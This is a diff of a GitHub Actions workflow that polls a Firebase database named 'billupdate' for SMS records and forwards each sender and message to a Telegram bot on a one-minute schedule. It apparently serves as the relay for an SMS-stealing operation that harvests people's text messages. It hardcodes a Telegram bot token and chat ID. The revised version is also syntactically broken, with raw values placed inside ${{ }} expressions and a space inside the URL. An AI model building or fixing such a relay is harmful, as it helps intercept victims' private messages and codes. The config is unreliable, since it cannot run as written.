@@ -1,49 +1,29 @@
-name: SMS to Telegram
+name: SMS Checker
+
 on:
   schedule:
-    - cron: '*/2 * * * *'
-  workflow_dispatch:
+    - cron: "*/1 * * * *"   # runs every 1 minute
+  workflow_dispatch:        # allow manual run
+
 jobs:
   check-sms:
     runs-on: ubuntu-latest
+
     steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
       - name: Setup Node.js
-        uses: actions/setup-node@v3
+        uses: actions/setup-node@v4
         with:
-          node-version: '18'
+          node-version: "18"
+
       - name: Install dependencies
-        run: npm install axios
-      - name: Run SMS Forwarder
+        run: npm install
+
+      - name: Run SMS Forwarder Script
         env:
-          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
-          BOT_TOKEN: '8201318151:AAGelxS1S7B9Zj9Ck9qd5UeK8Kv0573I18Y'
-          CHAT_ID: '8194289567'
-        run: |
-          node -e "
-          const axios = require('axios');
-          const FIREBASE_URL = process.env.FIREBASE_URL;
-          const BOT_TOKEN = process.env.BOT_TOKEN;
-          const CHAT_ID = process.env.CHAT_ID;
-          console.log('Starting...');
-          async function main() {
-            try {
-              const res = await axios.get(FIREBASE_URL + '/messages/messages.json?orderBy=\"telegram_sent\"&equalTo=null');
-              const msgs = res.data;
-              if (!msgs) { console.log('No messages'); return; }
-              for (const [id, data] of Object.entries(msgs)) {
-                const msg = '🔔 *NEW SMS*\\\\n📞 From: ' + data.sender + '\\\\n📝 ' + data.message;
-                await axios.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                  chat_id: CHAT_ID,
-                  text: msg,
-                  parse_mode: 'Markdown'
-                });
-                await axios.patch(FIREBASE_URL + '/messages/messages/' + id + '.json', {
-                  telegram_sent: true,
-                  sent_at: Date.now()
-                });
-                console.log('Sent:', id);
-              }
-            } catch (err) { console.error('Error:', err.message); }
-          }
-          main();
-          "
+          BOT_TOKEN: ${{ 8201318151:AAGelxS1S7B9Zj9Ck9qd5UeK8Kv0573I18Y }}
+          CHAT_ID: ${{ 8194289567 }}
+          FIREBASE_URL: ${{ https://billupdate-2c426  -default-rtdb.asia-southeast1.firebasedatabase.app/messages/messages.json }}
+        run: node sms-checker.js
